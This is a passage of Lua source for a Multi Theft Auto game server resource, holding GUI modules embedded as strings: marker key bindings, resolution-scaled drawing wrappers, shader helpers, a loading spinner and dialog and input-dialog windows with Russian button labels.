			source.dimension == player.dimension and
			source.interior == player.interior and
			player == localPlayer and bindElements[source]
		) then

			if not player.vehicle or (bindElements[source].acceptVehicle and localPlayer.vehicleSeat == 0) then
				callBindHandler(source)
			else
				waitForExit = source
			end

		end
	end

	local function onLeave(player)
		if (
			source.dimension == player.dimension and
			source.interior == player.interior and
			player == localPlayer
		) then
			setTooltipState(false)
			waitForExit = nil
			currentBindElement = nil
			removeHandlers()
		end
	end

	addEventHandler('onClientElementDestroy', resourceRoot, function()
		if source == currentBindElement then
			setTooltipState(false)
			removeHandlers()
			currentBindElement = nil
		end
	end)

	------------------------------------------------

	------------------------------------------------

	function dialogSetSpeaker(name)
		currentDialogStructure.speaker = name
	end

	function createBindHandler(element, key, text, func, acceptVehicle)

		if bindElements[element] then return end

		bindElements[element] = {
			text = text,
			func = func,
			key = key,
			acceptVehicle = acceptVehicle,
			check = setTimer(function(element)

				if element == currentBindElement then
					local x,y,z = getElementPosition(localPlayer)
					local ex,ey,ez = getElementPosition(element)

					local dist = getDistanceBetweenPoints3D(x,y,z, ex,ey,ez)

					if not (dist < 10 and
						element.interior == localPlayer.interior and
						element.dimension == localPlayer.dimension
					) then
						setTooltipState(false)
						removeHandlers()
						currentBindElement = nil
					end

				end


			end, 1000, 0, element),
		}

		addEventHandler('onClientMarkerHit', element, onHit)
		addEventHandler('onClientMarkerLeave', element, onLeave)

		if isElementWithinMarker(localPlayer, element) then
			setTimer(callBindHandler, 500, 1, element)
		end

	end

	function removeBindHandler(element)

		if currentBindElement == element then
			setTooltipState(false)
			currentBindElement = nil
			removeHandlers()
		end

		if bindElements[element] and isTimer(bindElements[element].check) then
			killTimer(bindElements[element].check)
		end

		bindElements[element] = nil
	end
]===]
			includes['gui.module.utils'] = [===[--gui.module.utils


GUI_MODULE_UTILS = true
clearGuiTextures = true

sx,sy = 1920, 1080
real_sx,real_sy = guiGetScreenSize()

function px(value)
	return math.floor(value*(real_sx/sx)*drawScale)
end

function px_y(value)
	return math.floor(value*(real_sy/sy)*drawScale)
end

function px_noround(value)
	return value*(real_sx/sx)*drawScale
end

------------------------------------------------------------------------------------------

addCommandHandler('res', function(_, w,h)
	w,h = tonumber(w), tonumber(h)
	if w and h then
		real_sx, real_sy = w,h
	end
end)

------------------------------------------------------------------------------------------

curDrawingTextures = {}

function destroyRenderTargets(element)

	if isElement(element.renderTarget) then
		destroyElement(element.renderTarget)
		element.renderTarget = nil
	end

	for _, c_element in pairs( element.elements or {} ) do
		destroyRenderTargets(c_element)
	end

end

function destroyAllDrawingTextures()

	

	-- if not getElementData(localPlayer, 'settings.textures_cache') then return end

	if not clearGuiTextures then return end

	for path, texture in pairs(curDrawingTextures) do
		if isElement(texture) then
			destroyElement(texture)
			curDrawingTextures[path] = nil
		end
	end

	if windowModel then
		for _, section in pairs(windowModel) do
			for elementId, element in pairs(section) do
				destroyRenderTargets(element)
			end
		end
	end

	clearFonts()

end

function createDrawingTexture(path)
	if not fileExists(path) then return false end
	if isElement(curDrawingTextures[path]) then return curDrawingTextures[path] end
	curDrawingTextures[path] = dxCreateTexture(path, 'argb', true, 'clamp')

	return curDrawingTextures[path]
end

function getDrawingTexture(path)
	return isElement(path) and path
		or (curDrawingTextures[path] or createDrawingTexture(path))
end

------------------------------------------------------------------------------------------

function setDrawScale(value)
	drawScale = value
	xCenter,yCenter = sx/2/drawScale, sy/2/drawScale
end

setDrawScale(1)

mta_dxDrawImage = dxDrawImage
mta_dxDrawImageSection = dxDrawImageSection
mta_dxDrawImage1 = mta_dxDrawImage


function mta_dxDrawImage(x,y,w,h, image, r,ro1,ro2,c, pgui)
	mta_dxDrawImage1(
		x,y,
		math.floor(w),
		math.floor(h),
		getDrawingTexture(image), r,ro1,ro2,c, pgui
	)
end

function dxDrawImageSection(x,y,w,h,u,v,us,vs, image, r,ro1,ro2,c, pgui)
	mta_dxDrawImageSection(
		px(x),px(y),
		px(w),px(h),
		u, v,
		us, vs,
		getDrawingTexture(image), r,ro1,ro2,c, pgui
	)
end

function dxDrawImage(x,y,w,h, image, r,ro1,ro2,c, pgui)
	mta_dxDrawImage(
		px(x),px(y),
		px(w),
		px(h),
		image, r,ro1,ro2,c, pgui
	)
end

mta_dxDrawRectangle = dxDrawRectangle
function dxDrawRectangle(x,y,w,h, color, pgui)
	mta_dxDrawRectangle(
		px(x),px(y),px(w),px(h),
		color, pgui
	)
end

mta_dxDrawText = dxDrawText
mta_dxDrawText1 = mta_dxDrawText

function mta_dxDrawText(text, x1,y1,x2,y2, color, scalex, scaley, font, ax,ay,clip,wb, ...)
	mta_dxDrawText1(text,
		x1,y1,x2,y2,
		color, scalex, scaley, getFontElement(font), ax,ay,clip,wb,...
	)
end

function dxDrawText(text, x1,y1,x2,y2, color, scalex, scaley, font, ax,ay,clip,wb, ...)
	mta_dxDrawText(text,
		px(x1),px(y1),px(x2),px(y2),
		color, scalex, scaley, font, ax,ay,clip,wb,...
	)
end

mta_dxDrawLine = dxDrawLine
function dxDrawLine( startx, starty, endx, endy, color, w, ... )
	mta_dxDrawLine(
		px(startx),px(starty),px(endx),px(endy),
		color, px_noround(w), ...
	)
end


function isMouseInPosition ( x, y, width, height )
	if ( not isCursorShowing( ) ) then
		return false
	end
    local cx, cy = getCursorPosition ( )
    cx, cy = cx * real_sx, cy * real_sy

	x, y, width, height = px(x), px(y), px(width), px(height)
    
    if ( cx >= x ) and ( cx <= x + width )
	and ( cy >= y ) and ( cy <= y + height ) then
        return true
    else
        return false
    end
end
function mta_isMouseInPosition ( x, y, width, height )
	if ( not isCursorShowing( ) ) then
		return false
	end
    local cx, cy = getCursorPosition ( )
    cx, cy = cx * real_sx, cy * real_sy
    
    if ( cx >= x ) and ( cx <= x + width )
	and ( cy >= y ) and ( cy <= y + height ) then
        return true
    else
        return false
    end
end

function RGBToHex(red, green, blue, alpha)
	if( ( red < 0 or red > 255 or green < 0 or green > 255 or blue < 0 or blue > 255 ) or ( alpha and ( alpha < 0 or alpha > 255 ) ) ) then
		return nil
	end
	if alpha then
		return string.format("#%.2X%.2X%.2X%.2X", red, green, blue, alpha)
	else
		return string.format("#%.2X%.2X%.2X", red, green, blue)
	end
end]===]
			includes['gui.graphics'] = [===[--gui.graphics
--------------------------------------------------------------------------------------------

	loadstring( exports.core:include('timed_animations') )()

--------------------------------------------------------------------------------------------

	function convertColorToHLSL( color )
		return { color[1]/255, color[2]/255, color[3]/255, (color[4] or 255)/255 }
	end

--------------------------------------------------------------------------------------------

	local shaders = {}

	local function getShader(shader_name)

		shaders[shader_name] = isElement(shaders[shader_name])
			and shaders[shader_name]
			or exports.core:getGraphicsElement(shader_name)

		return isElement(shaders[shader_name]) and shaders[shader_name]

	end

--------------------------------------------------------------------------------------------

	local defaultBlurLevel = 2

	function getBlurTexture(texture, blurLevel, alpha)

		local blurShader = getShader('shader_blur')

		dxSetShaderValue(blurShader, 'gTexture', texture)
		dxSetShaderValue(blurShader, 'gTextureSize', { dxGetMaterialSize(texture) })
		dxSetShaderValue(blurShader, 'blurLevel', blurLevel or defaultBlurLevel)
		dxSetShaderValue(blurShader, 'alpha', alpha)

		return blurShader

	end

--------------------------------------------------------------------------------------------

	function cutTextureByMask(texture, settings)

		local maskShader = getShader('shader_mask')

		dxSetShaderValue(maskShader, 'gTexture', texture)
		dxSetShaderValue(maskShader, 'gMaskTexture', settings.mask)
		dxSetShaderValue(maskShader, 'gMode', settings.mode or 0)
		dxSetShaderValue(maskShader, 'gAlpha', settings.alpha or 1)

		return maskShader

	end

--------------------------------------------------------------------------------------------

	local roundMaskShader = exports.core:getGraphicsElement('shader_round_mask')

	function getRoundMask(texture, settings)

		local roundMaskShader = getShader('shader_round_mask')

		dxSetShaderValue(roundMaskShader, 'gTexture', texture)
		dxSetShaderValue(roundMaskShader, 'color', convertColorToHLSL( settings.color or {255,255,255,255} ))

		dxSetShaderValue(roundMaskShader, 'alpha', settings.alpha or 1)

		dxSetShaderValue(roundMaskShader, 'minAngle', settings.angle[1] or 0)
		dxSetShaderValue(roundMaskShader, 'maxAngle', settings.angle[2] or 360)

		return roundMaskShader

	end

--------------------------------------------------------------------------------------------

	function getScreenSource()
		return exports.core:getGraphicsElement('screen_source')
	end

--------------------------------------------------------------------------------------------

	function getTextureGradient(texture, settings)

		local gradientShader = getShader('shader_gradient')

		dxSetShaderValue(gradientShader, 'gTexture', texture)
		dxSetShaderValue(gradientShader, 'gGradientAngle', settings.angle)
		dxSetShaderValue(gradientShader, 'gStartColor', convertColorToHLSL(settings.color[1]))
		dxSetShaderValue(gradientShader, 'gEndColor', convertColorToHLSL(settings.color[2]))
		dxSetShaderValue(gradientShader, 'gAlpha', settings.alpha or 1)

		return gradientShader

	end

--------------------------------------------------------------------------------------------

	function getGrayTexture(texture, settings)

		local grayShader = getShader('shader_gray')

		dxSetShaderValue(grayShader, 'gTexture', texture)
		dxSetShaderValue(grayShader, 'gAlpha', settings.alpha or 1)

		return grayShader

	end


--------------------------------------------------------------------------------------------

	function dxDrawTextShadow(text, l,t,r,b,c,s,f,ax,ay,tsW,color,ct,func)
		local dFunc = func or dxDrawText
		if tsW > 0 then
			dFunc(ct or text,
				l + tsW, t + tsW, r + tsW, b + tsW,
				color or black, s, s, f, ax, ay)
			dFunc(ct or text,
				l - tsW, t + tsW, r - tsW, b + tsW,
				color or black, s, s, f, ax, ay)
			dFunc(ct or text,
				l + tsW, t - tsW, r + tsW, b - tsW,
				color or black, s, s, f, ax, ay)
			dFunc(ct or text,
				l - tsW, t - tsW, r - tsW, b - tsW,
				color or black, s, s, f, ax, ay)
		end

		if ct then
			dFunc(text,
				l, t, r, b,
				c, s, s, f, ax, ay, false, false, false, true)
		else
			dFunc(text,
				l, t, r, b,
				c, s, s, f, ax, ay)
		end

	end

--------------------------------------------------------------------------------------------

	local Loading_class = {

		init = function( self, data )

			data = data or {}

			timed_setAnimData( self, data.time or 1000 )
			setAnimData( self, 0.05 )

			return true

		end,

		destroy = function( self )

			timed_removeAnimData( self )
			removeAnimData( self )
			return true

		end,

		animate = function( self, time, callback )

			if time then
				timed_setAnimData( self, time )
			end

			animate(self, 1)

			timed_animate( self, true, function()

				setTimer(function()
					animate(self, 0)

					if callback then
						callback()
					end

				end, 500, 1)

			end )

			return true

		end,

		draw = function( self, x,y,w,h, color )

			local anim_data = timed_getAnimData(self)
			if not anim_data then return end

			local alpha_anim = getAnimData(self)

			local r_texture = getDrawingTexture(':core/assets/images/round_empty.png')

			dxDrawImage(
				x,y,w,h, r_texture, 360*anim_data,
				0, 0, tocolor(20, 20, 20, 255*alpha_anim)
			)

			local progress_texture = getRoundMask( r_texture, {
				color = color,
				alpha = 1*alpha_anim,
				angle = { 0, 360*anim_data },
			} )

			dxDrawImage(
				x+1,y+1,w-2,h-2, progress_texture, 360*anim_data
			)

			return true

		end,

	}

	function Loading( data )

		local obj = {}
		setmetatable(obj, {__index = Loading_class})

		obj:init()

		return obj

	end

--------------------------------------------------------------------------------------------

	local Loading_links = {}
	function displayLoading( coords, color, time, callback )

		local loading = Loading()

		Loading_links[loading] = loading

		loading.coords = coords
		loading.color = color
		loading.callback = callback

		loading:animate( time, function()

			if loading.callback then
				loading.callback()
			end

			loading:destroy()
			Loading_links[loading] = nil

		end )

	end


	addEventHandler('onClientRender', root, function()

		for loading in pairs( Loading_links ) do
			local x,y,w,h = unpack(loading.coords)
			loading:draw( x,y,w,h, loading.color )
		end

	end, true, 'low-1000')

--------------------------------------------------------------------------------------------

	function drawImageSection( x,y, w,h, _texture, progress, color, direction, mta_draw )

		local texture, mw,mh

		if getDrawingTexture then
			texture = getDrawingTexture( _texture )
			mw,mh = dxGetMaterialSize(texture)
		else
			texture = _texture
			mw,mh = w,h
		end

		local func = mta_draw and mta_dxDrawImageSection or dxDrawImageSection

		if direction == 1 then

			progress.x = 1 - progress.x
			progress.y = 1 - progress.y

			func(
				x + w * progress.x, y + h * progress.y,
				w - w * progress.x, h - h * progress.y,
				w * progress.x, h * progress.y,
				w - w * progress.x, h - h * progress.y,
				texture,
				0,0,0, color
			)

		else
			func(
				x, y,
				w * progress.x, h * progress.y,
				0, 0,
				mw * progress.x, mh * progress.y,
				texture,
				0,0,0, color
			)
		end


	end

	function mta_drawImageSection( x,y, w,h, _texture, progress, color, direction )
		drawImageSection( x,y, w,h, _texture, progress, color, direction, true )
	end

--------------------------------------------------------------------------------------------

	function drawSmartText(text, x1,x2, y, c, ic, s, f, ax, ics, icp, ic_add)

		local imgSize = ics or 30
		local padding = icp or 5
		local splitted = splitString(text, '<img>')
		ax = ax or 'left'

		if ax == 'left' then

			local startX = x1


			if #splitted == 1 then

				dxDrawText(splitted[1],
					x1,y,x2,y,
					c, s, s, f,
					'left', 'center', false, false, false, true
				)

			else

				for _, row in pairs( splitted ) do

					local sRow = splitString(row, '</img>')

					if #sRow == 1 then

						local textWidth = dxGetTextWidth(sRow[1], s, f, true)

						dxDrawText(sRow[1],
							startX,
							y,
							startX,
							y,
							c,
							s, s, f,
							'left', 'center', false, false, false, true
						)

						startX = startX + textWidth/real_sx*sx + padding

					else

						dxDrawImage(
							startX, y - imgSize/2+(ic_add or 0),
							imgSize, imgSize, sRow[1], 0, 0, 0,
							ic
						)

						startX = startX + imgSize + padding

						local textWidth = dxGetTextWidth(sRow[2], s, f, true)

							dxDrawText(sRow[2],
							startX,
							y,
							startX,
							y,
							c,
							s, s, f,
							'left', 'center', false, false, false, true
						)

						startX = startX + textWidth/real_sx*sx + padding

					end



				end

			end

		elseif ax == 'center' then

			if #splitted == 1 then

				dxDrawText(splitted[1],
					x1,y,x2,y,
					c, s, s, f,
					'center', 'center', false, false, false, true
				)

			else

				local totalWidth = 0
				local d_elements = {}

				for _, row in pairs( splitted ) do

					local sRow = splitString(row, '</img>')

					if #sRow == 1 then

						local textWidth = dxGetTextWidth(sRow[1], s, f, true)

						totalWidth = totalWidth + textWidth + padding
						table.insert(d_elements, { text = sRow[1], width = textWidth + padding } )

					else

						table.insert(d_elements, { image = sRow[1], width = imgSize + padding } )

						local textWidth = dxGetTextWidth(sRow[2], s, f, true)

						table.insert(d_elements, { text = sRow[2], width = textWidth + padding } )

						totalWidth = totalWidth + textWidth + padding + imgSize + padding

					end

				end

				local startX = (x1 + x2)/2 - totalWidth/2

				for _, d_element in pairs( d_elements ) do

					if d_element.text then

						dxDrawText(d_element.text,
							startX, y,
							startX, y,
							c, s, s, f,
							'left', 'center', false, false, false, true
						)


					elseif d_element.image then

						dxDrawImage(
							startX, y-imgSize/2+(ic_add or 0),
							imgSize, imgSize,
							d_element.image,
							0, 0, 0, ic
						)

					end	
					
					startX = startX + d_element.width

				end


			end

		end

	end


--------------------------------------------------------------------------------------------
]===]
			includes['gui.dialog'] = [===[--gui.dialog

	local dialogWindow = {

		{'image',

			'center', 0,
			416, 183,
			':core/assets/images/gui_dialog/bg.png',

			id = 'dialog_element',

			color = {24, 30, 66, 255},

			onRender = function(element)

				local alpha = element:alpha()
				local x,y,w,h = element:abs()

				if not element.current_data then return end

				local texture = getDrawingTexture(element[6])
				local gradient = getTextureGradient(texture, {
					angle = 150,
					color = {
						{ 0, 0, 0, 0, },
						{ 180, 70, 70, 50 },
						alpha = alpha,
					},	
				})

				dxDrawImage(
					x,y,w,h, gradient
				)

				dxDrawText(element.current_data.name,
					x, y + 35,
					x+w, y + 35,
					tocolor(255,255,255,255*alpha),
					0.5, 0.5, getFont('montserrat_semibold', 30, 'light'),
					'center', 'top'
				)

				dxDrawText(element.current_data.text,
					x, y + 70,
					x+w, y + 70,
					tocolor(255,255,255,255*alpha),
					0.5, 0.5, getFont('montserrat_medium', 24, 'light'),
					'center', 'top', false, false, false, true
				)

			end,

			onPreRender = function(element)

				local alpha = element:alpha()
				local x,y,w,h = element:abs()

				local sw,sh = 434, 201

				dxDrawImage(
					x+w/2-sw/2, y+h/2-sh/2+5+(element.y_add or 0)/2, sw,sh,
					':core/assets/images/gui_dialog/bg_shadow.png',
					0, 0, 0, tocolor(0, 0, 0, 255*alpha)
				)

			end,

			elements = {

				{'element',
					'center', 'bottom',
					316, 70,
					color = {255,255,255,255},

					onRender = function(element)
						element[3] = element.parent[5] - element[5]
					end,

					elements = {

						{'button',

							'left', 0,
							153, 41,

							color = {180, 70, 70, 255},
							activeColor = {180, 70, 70, 255},
							'Продолжить',

							define_from = false,

							bg = ':core/assets/images/gui_dialog/btn_empty.png',
							activeBg = ':core/assets/images/gui_dialog/btn.png',

							font = getFont('montserrat_semibold', 21, 'light'),
							scale = 0.5,

							onPreRender = function(element)

								local alpha = element:alpha()
								local x,y,w,h = element:abs()

								local shx,shy,shw,shh = x + w/2 - 197/2, y + h/2 - 91/2, 197, 91

								dxDrawImage(
									shx,shy,shw,shh, ':core/assets/images/gui_dialog/btn_empty_shadow.png',
									0, 0, 0, tocolor(180, 70, 70, 255*alpha*(1-element.animData))
								)

								dxDrawImage(
									shx,shy,shw,shh, ':core/assets/images/gui_dialog/btn_shadow.png',
									0, 0, 0, tocolor(180, 70, 70, 255*alpha*element.animData)
								)

							end,

							onInit = function(element)
								element.x0 = element[2]
							end,

							onRender = function(element)

								if element.parent.parent.current_data.callback then
									element[2] = element.x0
								else
									element[2] = element.parent[4]/2 - element[4]/2
								end

							end,

							onClick = function(element)

								local data = element.parent.parent.current_data

								if data.prev_section then
									currentWindowSection = data.prev_section
								else
									closeWindow()
								end

								if data.callback then
									data.callback(true)
								end

							end,

						},

						{'button',

							'right', 0,
							153, 41,

							color = {180, 70, 70, 255},
							activeColor = {180, 70, 70, 255},
							'Отмена',

							define_from = false,

							bg = ':core/assets/images/gui_dialog/btn_empty.png',
							activeBg = ':core/assets/images/gui_dialog/btn.png',

							font = getFont('montserrat_semibold', 21, 'light'),
							scale = 0.5,

							onPreRender = function(element)

								local alpha = element:alpha()
								local x,y,w,h = element:abs()

								local shx,shy,shw,shh = x + w/2 - 197/2, y + h/2 - 91/2, 197, 91

								dxDrawImage(
									shx,shy,shw,shh, ':core/assets/images/gui_dialog/btn_empty_shadow.png',
									0, 0, 0, tocolor(180, 70, 70, 255*alpha*(1-element.animData))
								)

								dxDrawImage(
									shx,shy,shw,shh, ':core/assets/images/gui_dialog/btn_shadow.png',
									0, 0, 0, tocolor(180, 70, 70, 255*alpha*element.animData)
								)

							end,

							onClick = function(element)

								local data = element.parent.parent.current_data

								if data.prev_section then
									currentWindowSection = data.prev_section
								else
									closeWindow()
								end

								if data.callback then
									data.callback(false)
								end

							end,

							noDraw = function(element)
								return not element.parent.parent.current_data.callback
							end,

						},

					},

				},

			},

		},


	}

	local inputDialogWindow = {

		{'image',

			'center', 0,
			416, 216,
			':core/assets/images/gui_dialog/ibg.png',

			id = 'dialog_element',

			color = {24, 30, 66, 255},

			onRender = function(element)

				local alpha = element:alpha()
				local x,y,w,h = element:abs()

				if not element.current_data then return end

				local texture = getDrawingTexture(element[6])
				local gradient = getTextureGradient(texture, {
					angle = 150,
					color = {
						{ 0, 0, 0, 0, },
						{ 180, 70, 70, 50 },
						alpha = alpha,
					},	
				})

				dxDrawImage(
					x,y,w,h, gradient
				)

				dxDrawText(element.current_data.name,
					x, y + 35,
					x+w, y + 35,
					tocolor(255,255,255,255*alpha),
					0.5, 0.5, getFont('montserrat_semibold', 30, 'light'),
					'center', 'top'
				)

				dxDrawText(element.current_data.text,
					x, y + 70,
					x+w, y + 70,
					tocolor(255,255,255,255*alpha),
					0.5, 0.5, getFont('montserrat_medium', 24, 'light'),
					'center', 'top', false, false, false, true
				)

			end,

			onPreRender = function(element)

				local alpha = element:alpha()
				local x,y,w,h = element:abs()

				local sw,sh = 434, 201

				dxDrawImage(
					x+w/2-sw/2, y+h/2-sh/2+5+(element.y_add or 0)/2, sw,sh,
					':core/assets/images/gui_dialog/bg_shadow.png',
					0, 0, 0, tocolor(0, 0, 0, 255*alpha)
				)

			end,

			elements = {

				{'element',
					'center', 'bottom',
					316, 70,
					color = {255,255,255,255},

					onRender = function(element)
						element[3] = element.parent[5] - element[5]
					end,

					elements = {

						{'button',

							'left', 0,
							153, 41,

							color = {180, 70, 70, 255},
							activeColor = {180, 70, 70, 255},
							'Продолжить',

							define_from = false,

							bg = ':core/assets/images/gui_dialog/btn_empty.png',
							activeBg = ':core/assets/images/gui_dialog/btn.png',

							font = getFont('montserrat_semibold', 21, 'light'),
							scale = 0.5,

							onPreRender = function(element)

								local alpha = element:alpha()
								local x,y,w,h = element:abs()

								local shx,shy,shw,shh = x + w/2 - 197/2, y + h/2 - 91/2, 197, 91

								dxDrawImage(
									shx,shy,shw,shh, ':core/assets/images/gui_dialog/btn_empty_shadow.png',
									0, 0, 0, tocolor(180, 70, 70, 255*alpha*(1-element.animData))
								)

								dxDrawImage(
									shx,shy,shw,shh, ':core/assets/images/gui_dialog/btn_shadow.png',
									0, 0, 0, tocolor(180, 70, 70, 255*alpha*element.animData)
								)

							end,

							onClick = function(element)

								local data = element.parent.parent.current_data
								local callback_data = {}

								local input_elements = gui_get('input_elements')

								for _, _element in pairs( input_elements.elements ) do
									table.insert( callback_data, _element:getValue() )
								end

								if data.prev_section then
									currentWindowSection = data.prev_section
								else
									closeWindow()
								end

								if data.callback then
									data.callback(callback_data)
								end

							end,

						},

						{'button',

							'right', 0,
							153, 41,

							color = {180, 70, 70, 255},
							activeColor = {180, 70, 70, 255},
							'Отмена',

							define_from = false,

							bg = ':core/assets/images/gui_dialog/btn_empty.png',
							activeBg = ':core/assets/images/gui_dialog/btn.png',

							font = getFont('montserrat_semibold', 21, 'light'),
							scale = 0.5,

							onPreRender = function(element)

								local alpha = element:alpha()
								local x,y,w,h = element:abs()

								local shx,shy,shw,shh = x + w/2 - 197/2, y + h/2 - 91/2, 197, 91

								dxDrawImage(
									shx,shy,shw,shh, ':core/assets/images/gui_dialog/btn_empty_shadow.png',
									0, 0, 0, tocolor(180, 70, 70, 255*alpha*(1-element.animData))
								)

								dxDrawImage(
									shx,shy,shw,shh, ':core/assets/images/gui_dialog/btn_shadow.png',
									0, 0, 0, tocolor(180, 70, 70, 255*alpha*element.animData)
								)

							end,

							onClick = function(element)

								local data = element.parent.parent.current_data

								if data.prev_section then
									currentWindowSection = data.prev_section
								else
									closeWindow()
								end

								if data.callback then
									data.callback(false)
								end

							end,

						},

					},

				},

				{'element',

					'center', 110,
					316, 0,
					color = {255,255,255,255},
					id = 'input_elements',

					elements = {



					},

				},

			},

		},


	}

---------------------------------------------------------------------------------------------

	_loadGuiModule = loadGuiModule
	function loadGuiModule()
		windowModel.gui_dialog = dialogWindow
		windowModel.gui_input_dialog = inputDialogWindow
		_loadGuiModule()
	end

---------------------------------------------------------------------------------------------

	function dialog(name, text, callback)

		local prev_section = windowOpened and currentWindowSection or false

		openWindow('gui_dialog')

		local element = gui_get('dialog_element')

		local h = 183
		local add = 0

		local scale, font = 0.5, getFont('montserrat_medium', 24, 'light')
		local fontHeight = dxGetFontHeight( scale, font )

		if type(text) == 'table' then
			add = fontHeight*(#text-1)
			h = h + add
		end

		element.y_add = add
		element[3] = sy/2 - h/2
		element[5] = h
		element[6] = createTextureSource('bordered_rectangle', ':core/assets/images/gui_dialog/bg.png', 22, element[4], element[5])

		if type(text) == 'table' then
			text = table.concat(text, '\n')
		end

		element.current_data = {
			name = name,
			text = text,
			callback = callback,
			prev_section = prev_section,
		}


	end

	function dialog_input(name, text, data, callback)

		local prev_section = windowOpened and currentWindowSection or false

		openWindow('gui_input_dialog')

		local element = gui_get('dialog_element')

		local h = 190
		local add = 0

		local scale, font = 0.5, getFont('montserrat_medium', 24, 'light')
		local fontHeight = dxGetFontHeight( scale, font )

		local input_elements = gui_get('input_elements')

		for _, _element in pairs(input_elements.elements) do
			_element:destroy()
		end

		if type(text) == 'table' then
			add = add + fontHeight*(#text-1)
		end

		input_elements.elements = {}

		local startY = add
		local element_w, element_h = 317, 41
		local padding = 10

		local lbg_source = createTextureSource('bordered_rectangle', ':core/assets/images/gui_dialog/lbg.png', 40, 280, 40)

		for _, input_data in pairs( data ) do

			local _element

			if input_data.type == 'text' then

				_element = {'input',
					'center', startY,
					element_w, element_h,

					define_from = false,

					color = {29, 37, 73, 255},
					placeholderColor = {73,77,100,255},
					bg = ':core/assets/images/gui_dialog/input.png',
					placeholder = input_data.name,

					'',

					scale = 0.5,
					font = getFont('montserrat_semibold', 22, 'light'),
					alignX = 'center',

					getValue = function(element)
						return element[6]
					end,

				}

			elseif input_data.type == 'number' then

				_element = {'input',
					'center', startY,
					element_w, element_h,

					define_from = false,

					color = {29, 37, 73, 255},
					placeholderColor = {85, 89, 111, 255},
					placeholder = input_data.name,

					bg = ':core/assets/images/gui_dialog/input.png',
					'',

					type = 'number',

					scale = 0.5,
					font = getFont('montserrat_semibold', 22, 'light'),
					alignX = 'center',

					getValue = function(element)
						return tonumber(element[6])
					end,

				}

			elseif input_data.type == 'select' then

				_element = {'select',

					'center', startY,
					element_w, element_h,
					bg = ':core/assets/images/gui_dialog/input.png',
					color = {29, 37, 73, 255},
					textColor = {255,255,255,255},

					define_from = false,

					selectElements = {},
					animSpeed = 0.1,

					placeholderColor = {85, 89, 111, 255},

					placeholder = input_data.name or '',
					alignX = 'center',

					listElementHeight = 50,

					lbg = lbg_source,

					additionalElementDrawing = function(lElement, x,y,w,ey, element, animData)

						local alpha = element:alpha()
						alpha = math.clamp(alpha, 0, 1)

						local x,y,w,h = x,y, element[4], element.listElementHeight

						local bw,bh = 280, 40

						local bx,by = x+w/2-bw/2, y+h/2-bh/2

						local r,g,b = interpolateBetween(24,30,66, 180,70,70, animData, 'InOutQuad')

						dxDrawImage(
							bx,by,bw,bh, element.parent.lbg,
							0, 0, 0, tocolor(r,g,b,255*alpha)
						)


						for i = 1,2 do
							dxDrawText(lElement.name,
								x,y,x+w,y+h,
								tocolor(255,255,255,255*alpha),
								0.5, 0.5, getFont('montserrat_semibold', 23, 'light'),
								'center', 'center'
							)
						end

					end,

					getSelectedText = function(element)
						return element.selectList.lastSelectedItem.name
					end,

					onPostInit = function(element)

						if element.selectList[5] > 0 then
							element.list_bg = createTextureSource('bordered_rectangle',
								':core/assets/images/gui_dialog/lst_bg.png', 20,
								element[4], element.selectList[5]
							)
						else
							element.list_bg = transparentTexture
						end

					end,

					onRender = function(element)

						local x,y,w,h = element:abs()
						local alpha = element:alpha()

						local bw,bh = 25, 25
						local bx,by = x+w-bw-10, y+h/2-bh/2

						local animData = getAnimData(element.select_animData)
						animData = getEasingValue(animData, 'InOutQuad')

						dxDrawImage(
							bx,by,bw,bh, ':core/assets/images/gui_dialog/select_btn.png',
							0, 0, 0, tocolor(180, 70, 70, 255*alpha)
						)
						dxDrawImage(
							bx+bw/2-20/2,by+bh/2-20/2,20,20, ':core/assets/images/gui_dialog/select_arrow.png',
							180*animData, 0, 0, tocolor(255, 255, 255, 255*alpha)
						)


					end,

					getValue = function( element )
						return element.selectList.lastSelectedItem.data
					end,

					scale = 0.5,
					font = getFont('montserrat_semibold', 25, 'light'),

				}

			end

			for key, value in pairs( input_data.params or {} ) do
				_element[key] = value
			end

			input_elements:addElement(_element)

			startY = startY + element_h + padding
			add = add + element_h + padding

		end

		h = h + add

		element.y_add = add
		element[3] = sy/2 - h/2
		iprint("element[5]", h, "3", sy/2-h/2)
		element[5] = h
		element[6] = createTextureSource('bordered_rectangle', ':core/assets/images/gui_dialog/ibg.png', 22, element[4], element[5])

		if type(text) == 'table' then
			text = table.concat(text, '\n')
		end

		element.current_data = {
			name = name,
			text = text,
			callback = callback,
			prev_section = prev_section,
		}

	end

---------------------------------------------------------------------------------------------
]===]
			